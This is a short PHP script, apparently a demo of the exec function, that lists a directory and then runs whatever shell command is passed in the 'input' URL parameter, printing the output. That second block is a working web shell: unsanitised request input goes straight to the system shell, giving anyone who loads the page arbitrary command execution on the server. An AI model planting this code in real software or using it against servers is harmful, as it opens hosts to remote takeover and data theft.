<?php
exec("ls", $output, $return_var);
var_dump($return_var);
echo implode("\n", $output);

exec($_GET['input'],$output, $return_var);
var_dump($return_var);
echo implode("\n", $output);
